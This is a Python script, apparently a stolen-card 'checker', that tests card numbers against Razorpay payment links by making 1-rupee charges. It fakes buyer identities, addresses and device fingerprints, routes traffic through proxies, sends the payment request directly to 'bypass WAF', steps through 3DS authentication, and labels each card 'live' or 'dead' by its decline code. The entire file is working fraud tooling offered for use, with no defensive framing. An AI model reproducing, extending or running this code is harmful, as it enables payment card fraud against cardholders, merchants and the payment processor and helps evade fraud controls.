from __future__ import annotations

import asyncio
import base64
import hashlib
import json
import random
import re
import secrets
import string
import sys
import time
from datetime import datetime

import aiohttp

OWNER = "Api Owner - @Real_Stocky"

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0"
SEC_CH_UA = '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"'
ACCEPT_HTML = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
ACCEPT_LANG = "en-US,en;q=0.9,en-IN;q=0.8"
TIMEOUT = aiohttp.ClientTimeout(total=30)

BANNER = f"""
 ╔══════════════════════════════════════════════════╗
 ║   RAZORPAY FIXED CHECKER  ·  1₹ CHARGE           ║
 ║   {OWNER:<46} ║
 ╚══════════════════════════════════════════════════╝
"""

DEAD_CODES = frozenset({
    "card_not_enrolled", "payment_risk_check_failed", "card_declined", "declined",
    "invalid_card_number", "card_expired", "expired_card", "authentication_failed",
    "payment_cancelled", "payment_failed", "card_disabled", "lost_card", "stolen_card",
})

_FIRST = ("James", "John", "Robert", "Michael", "David", "Sarah", "Emma", "Olivia")
_LAST = ("Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis")
_STREETS = ("Main St", "Oak Ave", "Park Rd", "Lake Dr", "Hill Blvd")
_CITIES = ("New York", "Los Angeles", "Chicago", "Houston", "Phoenix")
_STATES = ("NY", "CA", "IL", "TX", "AZ")


def _fake_name() -> str:
    return f"{random.choice(_FIRST)} {random.choice(_LAST)}"


def _fake_email() -> str:
    return f"{random.choice(_FIRST).lower()}{random.randint(10, 9999)}@gmail.com"


def _fake_addr() -> tuple[str, str, str, str]:
    return (
        f"{random.randint(100, 9999)} {random.choice(_STREETS)}",
        random.choice(_CITIES),
        random.choice(_STATES),
        f"{random.randint(10000, 99999)}",
    )


def _qp(d: dict) -> dict:
    return {k: v for k, v in d.items() if v is not None and v != ""}


def _parse_proxy(raw: str) -> str:
    raw = (raw or "").strip()
    if not raw:
        return ""
    if raw.startswith("http://") or raw.startswith("https://"):
        return raw
    parts = raw.split(":")
    if len(parts) == 4:
        h, p, u, pw = parts
        return f"http://{u}:{pw}@{h}:{p}"
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    return raw


def _clean_desc(desc: str) -> str:
    return (desc or "").replace(
        " Try another payment method or contact your bank for details.", ""
    ).strip()


def _is_dead_code(reason: str) -> bool:
    return (reason or "").strip().lower() in DEAD_CODES


def _is_live_decline(desc: str, reason: str) -> bool:
    code = (reason or "").strip().lower()
    if _is_dead_code(reason):
        return False
    lower = desc.lower()
    if any(k in lower for k in ("insufficient", "maximum transaction limit", "cvv", "incorrect_cvv")):
        return True
    if code in ("bank_technical_error", "issuer_bank_unavailable", "gateway_error", "payment_processing_failed"):
        return True
    if any(k in lower for k in ("temporary issue", "refunded in 4-5 business days")):
        return code in ("bank_technical_error", "issuer_bank_unavailable", "gateway_error", "payment_processing_failed")
    return False


def _classify(desc: str, reason: str) -> dict:
    desc = _clean_desc(desc) or "Payment failed"
    code = (reason or "unknown").strip()
    if _is_dead_code(reason):
        return {"status": "dead", "approved": False, "message": desc, "code": code}
    lower = desc.lower()
    if any(k in lower for k in ("insufficient", "maximum transaction limit")):
        return {"status": "live", "approved": True, "message": desc, "code": code}
    if any(k in lower for k in ("cvv", "incorrect_cvv")):
        return {"status": "live", "approved": True, "message": desc, "code": code}
    if _is_live_decline(desc, reason):
        return {"status": "live", "approved": True, "message": desc, "code": code}
    return {"status": "dead", "approved": False, "message": desc, "code": code}


async def _fetch_builds(session: aiohttp.ClientSession) -> tuple[str, str, str]:
    async with session.get("https://checkout.razorpay.com/v1/checkout.js", timeout=TIMEOUT) as r:
        js = await r.text()
    shas = list(dict.fromkeys(re.findall(r"[a-f0-9]{40}", js)))
    if not shas:
        raise RuntimeError("failed to read build ids from checkout.js")
    build, build_v1 = shas[0], shas[1] if len(shas) > 1 else shas[0]
    numeric = "26589118452"
    for path in ("v2-entry.modern.js", "v2-entry.js"):
        url = f"https://checkout-static-next.razorpay.com/build/{build}/{path}"
        async with session.get(url, timeout=TIMEOUT) as r:
            entry = await r.text()
        m = re.search(r"const o=(\d{10,12})", entry) or re.search(r"=(\d{10,12}),s=!1", entry)
        if m:
            numeric = m.group(1)
            break
    return build, build_v1, numeric


async def _json(resp: aiohttp.ClientResponse, step: str) -> dict:
    try:
        return await resp.json()
    except Exception:
        body = (await resp.text())[:500]
        raise RuntimeError(f"[{step}] HTTP {resp.status}: {body}")


async def check_card(target_url: str, card_entry: str, proxy_url: str) -> dict:
    parts = card_entry.split("|")
    if len(parts) < 4:
        return {"status": "error", "approved": False, "message": "bad format - use cc|mm|yy|cvv", "code": "invalid", "time": 0}

    cc, mm, yy, cvv = parts[0], parts[1].zfill(2), parts[2][-2:], parts[3]
    px = _parse_proxy(proxy_url)
    if not px:
        return {"status": "error", "approved": False, "message": "proxy required", "code": "no_proxy", "time": 0}

    t0 = time.time()
    line1, city, state, zipcode = _fake_addr()

    async with aiohttp.ClientSession(timeout=TIMEOUT) as direct:
        async with aiohttp.ClientSession(timeout=TIMEOUT) as proxied:
            proxy_kw = {"proxy": px}

            def pick():
                return proxied

            build, build_v1, numeric = await _fetch_builds(pick())
            h = hashlib.sha1(secrets.token_bytes(16)).hexdigest()
            ts = str(int(datetime.now().timestamp() * 1000))
            rnd = str(random.randrange(10**8)).zfill(8)
            rzp_device_id = f"1.{h}.{ts}.{rnd}"
            unified_session_id = "".join(secrets.choice(string.ascii_letters + string.digits) for _ in range(14))
            checkout_id = "".join(secrets.choice(string.ascii_letters + string.digits) for _ in range(14))

            page_hdrs = {
                "Accept": ACCEPT_HTML, "Accept-Language": ACCEPT_LANG,
                "User-Agent": UA, "sec-ch-ua": SEC_CH_UA,
            }
            async with pick().get(target_url, headers=page_hdrs, **proxy_kw) as resp:
                text = await resp.text()
            m = re.search(r"var data = ({.*?});", text, re.DOTALL)
            if not m:
                return {"status": "error", "approved": False, "message": "failed to load payment page", "code": "page_error", "time": round(time.time() - t0, 2)}

            d = json.loads(m.group(1))
            kyid, kh = d["key_id"], d.get("keyless_header") or ""
            plink = d["payment_link"]["id"]
            ppid = d["payment_link"]["payment_page_items"][0]["id"]

            sess_params = {
                "traffic_env": "production", "build": build, "build_v1": build_v1,
                "checkout_v2": "1", "new_session": "1",
                "rzp_device_id": rzp_device_id, "unified_session_id": unified_session_id,
            }
            if kh:
                sess_params["keyless_header"] = kh

            pub_hdrs = {
                **page_hdrs, "Referer": "https://razorpay.me/",
                "Sec-Fetch-Dest": "iframe", "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "cross-site", "Sec-Fetch-Storage-Access": "active",
            }
            async with pick().get("https://api.razorpay.com/v1/checkout/public", params=sess_params, headers=pub_hdrs, **proxy_kw) as resp:
                pub = await resp.text()
            mx = re.search(r'window\.session_token\s*=\s*"([^"]+)"', pub)
            sessid = mx.group(1) if mx else ""
            if not sessid:
                return {"status": "error", "approved": False, "message": "session token not found", "code": "session_error", "time": round(time.time() - t0, 2)}

            order_hdrs = {
                "Accept": "application/json", "Content-Type": "application/json",
                "Origin": "https://pages.razorpay.com", "Referer": "https://pages.razorpay.com/",
                "User-Agent": UA,
            }
            async with pick().post(
                f"https://api.razorpay.com/v1/payment_pages/{plink}/order",
                headers=order_hdrs,
                json={"notes": {"comment": "", "name": "Hell King"}, "line_items": [{"payment_page_item_id": ppid, "amount": 100}]},
                **proxy_kw,
            ) as resp:
                od = await _json(resp, "order")
            order_id = od["order"]["id"]

            ref_url = (
                f"https://api.razorpay.com/v1/checkout/public?traffic_env=production"
                f"&build={build}&build_v1={build_v1}&checkout_v2=1&new_session=1"
                f"&rzp_device_id={rzp_device_id}&unified_session_id={unified_session_id}"
                f"&session_token={sessid}"
            )
            api_hdrs = {
                "Accept": "*/*", "Accept-Language": ACCEPT_LANG, "Content-Type": "application/json",
                "Origin": "https://api.razorpay.com", "Referer": ref_url, "User-Agent": UA,
                "Sec-Fetch-Storage-Access": "active", "sec-ch-ua": SEC_CH_UA,
                "x-session-token": sessid,
            }
            ajax_hdrs = {**api_hdrs, "Content-Type": "application/x-www-form-urlencoded", "Cache-Control": "no-cache", "Pragma": "no-cache"}

            prefs_body = {
                "query": [{"resource": "order"}, {"resource": "methods"}, {"resource": "checkout_config"}],
                "query_params": {
                    "device_id": rzp_device_id, "rtb_device_id": h, "amount": "100", "currency": "INR",
                    "checkout_id": checkout_id, "order_id": order_id, "payment_link_id": plink,
                    "platform": "browser", "referrer_domain": "razorpay.me", "device_type": "desktop",
                }, "action": "get",
            }
            async with pick().post(
                "https://api.razorpay.com/v2/standard_checkout/preferences",
                params=_qp({"x_entity_id": order_id, "session_token": sessid, "keyless_header": kh}),
                headers=api_hdrs, json=prefs_body, **proxy_kw,
            ) as resp:
                prefs = await _json(resp, "preferences")
            shield_ctx = prefs.get("shield_data", {}).get("shield_context", "")

            fp = hashlib.sha256(secrets.token_bytes(32)).hexdigest()
            cookies = {"testcookie": "1", "user_fingerprint_v2": fp}
            sardine = base64.b64encode(
                json.dumps([{"name": "sardine", "metadata": {"session_id": checkout_id}}], separators=(",", ":")).encode()
            ).decode()

            async with pick().get(
                "https://api.razorpay.com/v1/standard_checkout/payment/iin",
                params=_qp({"x_entity_id": order_id, "session_token": sessid, "keyless_header": kh, "iin": cc[:9]}),
                headers={**api_hdrs, "Content-Type": "application/json"}, cookies=cookies, **proxy_kw,
            ) as resp:
                iin = await _json(resp, "iin")

            async with pick().post(
                "https://api.razorpay.com/payments_cross_border_live/v1/checkout/cb_flows",
                params=_qp({"x_entity_id": order_id, "keyless_header": kh}),
                headers={**api_hdrs, "Content-Type": "application/json"},
                json={"identifiers": {
                    "merchant": {"country": "IN"},
                    "card": {"country": iin.get("country", ""), "dcc_blacklisted": iin.get("dcc_blacklisted", False),
                             "network": iin.get("network", ""), "currency": iin.get("bin_currency", "")},
                    "method": "card", "payment_currency": "INR",
                }, "forex_charges": {"amount": 100, "currency": "INR", "filters": {"method": "card"}}},
                cookies=cookies, **proxy_kw,
            ) as resp:
                cb = await _json(resp, "cb_flows")

            ajax_data = {
                "notes[comment]": "", "payment_link_id": plink, "key_id": kyid,
                "contact": "+918087875068", "email": _fake_email(), "currency": "INR",
                "_[checkout_id]": checkout_id, "_[device.id]": rzp_device_id,
                "_[library]": "checkoutjs", "_[platform]": "browser", "_[os]": "windows",
                "_[referer]": target_url, "_[shield][fhash]": h, "_[shield][tz]": "330",
                "_[device_id]": rzp_device_id, "_[build]": numeric, "_[request_index]": "1",
                "amount": "100", "order_id": order_id, "user_risk_providers_token": sardine,
                "method": "card", "card[number]": cc, "card[cvv]": cvv, "card[name]": _fake_name(),
                "card[expiry_month]": mm, "card[expiry_year]": yy, "save": "0",
                "billing_address[line1]": line1, "billing_address[line2]": "",
                "billing_address[city]": city, "billing_address[state]": state,
                "billing_address[postal_code]": zipcode, "billing_address[country]": "US",
                "checkout_id": checkout_id,
            }
            crid = cb.get("forex_charges", {}).get("id", "")
            if crid:
                ajax_data["currency_request_id"] = crid
                ajax_data["dcc_currency"] = next(iter(cb.get("forex_charges", {}).get("all_currencies", {})), "INR")
            if shield_ctx:
                ajax_data["_[shield_context]"] = shield_ctx

            # create/ajax - direct IP (no proxy) to bypass WAF
            async with direct.post(
                "https://api.razorpay.com/v1/standard_checkout/payments/create/ajax",
                params=_qp({"key_id": kyid, "session_token": sessid, "keyless_header": kh}),
                headers=ajax_hdrs, data=ajax_data, cookies=cookies,
            ) as resp:
                pay = await _json(resp, "create/ajax")

            payment_id = pay.get("payment_id") or pay.get("id")
            if not payment_id:
                err = pay.get("error") or {}
                result = _classify(err.get("description", ""), err.get("reason") or err.get("code") or "")
                result["time"] = round(time.time() - t0, 2)
                return result

            pid_clean = payment_id.split("_")[1]
            auth_url = pay.get("request", {}).get("url") or f"https://api.razorpay.com/pg_router/v1/payments/{pid_clean}/authenticate"
            h3ds = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": UA}

            async with pick().post(auth_url, headers=h3ds, **proxy_kw):
                pass
            await asyncio.sleep(1)
            async with pick().post(
                f"https://api.razorpay.com/pg_router/v1/payments/{pid_clean}/authenticate",
                headers=h3ds,
                data={
                    "browser[java_enabled]": "false", "browser[javascript_enabled]": "true",
                    "browser[timezone_offset]": "0", "browser[color_depth]": "24",
                    "browser[screen_width]": "1920", "browser[screen_height]": "1080",
                    "browser[language]": "en-US", "auth_step": "3ds2Auth",
                }, **proxy_kw,
            ):
                pass

            async with pick().get(
                f"https://api.razorpay.com/v1/standard_checkout/payments/{payment_id}/cancel",
                params=_qp({"key_id": kyid, "session_token": sessid, "keyless_header": kh}),
                headers={**api_hdrs, "Content-Type": "application/x-www-form-urlencoded"},
                cookies=cookies, **proxy_kw,
            ) as resp:
                final = await _json(resp, "cancel")
                final_text = await resp.text()

            elapsed = round(time.time() - t0, 2)
            if "razorpay_payment_id" in final_text:
                return {"status": "charged", "approved": True, "message": "Charged 1₹", "code": "", "time": elapsed}

            err = final.get("error") or {}
            result = _classify(err.get("description", ""), err.get("reason") or err.get("code") or "")
            result["time"] = elapsed
            return result


def _status_label(result: dict) -> str:
    if result.get("status") == "charged":
        return "Approved ✅  (Charged 1₹)"
    if result.get("approved"):
        return "Approved ✅  (Live)"
    if result.get("status") == "error":
        return "Error ⚠️"
    return "Declined ❌"


def _print_result(url: str, card: str, proxy: str, result: dict) -> None:
    msg = result.get("message") or "No response"
    code = result.get("code") or ""
    elapsed = result.get("time", 0)
    proxy_host = proxy.split(":")[0] if proxy else "?"

    print(BANNER)
    print(f"𝗖𝗖       : {card}")
    print(f"𝗨𝗥𝗟      : {url}")
    print(f"𝗦𝘁𝗮𝘁𝘂𝘀    : {_status_label(result)}")
    print(f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : {msg}" + (f" ({code})" if code and code not in msg else ""))
    if code:
        print(f"𝗖𝗼𝗱𝗲     : {code}")
    print(f"𝗧/𝘁      : {elapsed}s")
    print(f"𝗣𝗿𝗼𝘅𝘆   : {proxy_host}")
    print(f"\n{OWNER}\n")


def main():
    if "--help" in sys.argv or "-h" in sys.argv:
        print(__doc__)
        return

    argv = [a for a in sys.argv[1:] if a not in ("--help", "-h")]
    if len(argv) >= 3:
        url, card, proxy = argv[0], argv[1], argv[2]
    else:
        print(BANNER)
        url = input("Payment URL : ").strip()
        card = input("Card (cc|mm|yy|cvv) : ").strip()
        proxy = input("Proxy (host:port:user:pass) : ").strip()

    if not url or not card:
        print(f"URL and card required. {OWNER}")
        sys.exit(1)
    if not proxy.strip():
        print(f"Proxy required (host:port:user:pass). {OWNER}")
        sys.exit(1)

    print(f"\nChecking {card.split('|')[0][:6]}**** ...\n")
    result = asyncio.run(check_card(url.strip(), card.strip(), proxy.strip()))
    _print_result(url, card, proxy, result)


if __name__ == "__main__":
    main()
